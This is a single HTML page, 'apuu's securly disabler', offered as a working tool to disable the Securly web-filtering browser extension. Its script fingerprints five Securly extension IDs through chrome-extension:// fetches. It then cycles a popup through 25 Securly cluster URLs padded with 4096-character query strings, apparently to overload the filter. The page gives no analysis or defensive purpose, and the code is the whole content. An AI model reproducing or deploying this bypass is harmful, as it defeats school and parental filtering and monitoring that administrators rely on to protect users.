<!DOCTYPE html>
<html lang="en">
  <head>
    <title>apuu's securly disabler</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <style>
      body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        gap: 20px;
        background: #0b0b0d;
        background-image: radial-gradient(ellipse at 50% 0%, #1e1a2e 0%, transparent 60%);
        color: #eee;
        font: 15px/1.5 ui-monospace, monospace;
        padding: 24px;
        text-align: center;
      }
      h1 {
        margin: 0;
        font-size: 22px;
        font-weight: 700;
        letter-spacing: -0.01em;
        background: linear-gradient(90deg, #a78bfa, #f472b6);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
      }
      button {
        padding: 12px 28px;
        font: inherit;
        font-weight: 700;
        color: #0b0b0d;
        background: #a78bfa;
        border: 0;
        border-radius: 6px;
        cursor: pointer;
        transition: background 0.15s, transform 0.1s;
      }
      button:hover { background: #c4b5fd; }
      button:active { transform: scale(0.97); }
      button:disabled { background: #4b4463; color: #9b93b5; cursor: default; }
      #status {
        min-height: 1.5em;
        font-size: 13px;
        color: #8a8496;
      }
      #status.err { color: #f87171; }
    </style>
    <script>
      const from_id = (id) => document.getElementById(id);
      const ext_ids = [
        "iheobagjkfklnlikgihanlhcddjoihkg",
        "joflmkccibkooplaeoinecjbmdebglab",
        "ckecmkbnoanpgplccmnoikfmpcdladkc",
        "kfiocjonplkilcjfgabfngiddebalkod",
        "bmlalgfmolfmkjmnikbphgijefopggme"
      ];
      const clusters = ["www", "useast-www", "useast2-www", "ca-www", "uk-www"];
      const param_names = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"];

      const setStatus = (msg, isErr) => {
        const el = from_id("status");
        el.innerText = msg;
        el.classList.toggle("err", !!isErr);
      };

      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      function detect_ext() {
        return new Promise((resolve, reject) => {
          for (let id of ext_ids) {
            let url = `chrome-extension://${id}/tt-alert.svg`;
            fetch(url).then(() => resolve(true));
          }
          setTimeout(() => resolve(false), 500);
        });
      }

      async function disable_ext() {
        const btn = from_id("disable_button");
        btn.disabled = true;

        let w = null;
        let i = 1;
        let total = clusters.length * param_names.length;
        for (let cluster of clusters) {
          for (let param of param_names) {
            let url = `https://${cluster}.securly.com/please_wait/${i}/${total}?${param}=`;
            url += "a".repeat(4096 - url.length);

            if (!w) {
              w = window.open(url, "", "width=400,height=1");
              await sleep(2000);
            }
            else {
              w.location.href = url;
              await sleep(2000);
            }
            setStatus(`${i} / ${total}`);
            i++;
          }
        }
        w.close();
        setStatus("done");
        btn.disabled = false;
      }

      async function main() {
        setStatus("detecting…");

        let ext_detected = await detect_ext();
        if (!ext_detected) {
          setStatus("securly not found", true);
          return;
        }

        setStatus("allow popups, then click");
        const btn = from_id("disable_button");
        btn.style.display = "block";
        btn.onclick = disable_ext;
      }

      window.onload = main;
    </script>
  </head>
  <body>
    <h1>apuu's securly disabler</h1>
    <button id="disable_button" style="display: none">disable</button>
    <div id="status"></div>
  </body>
</html>
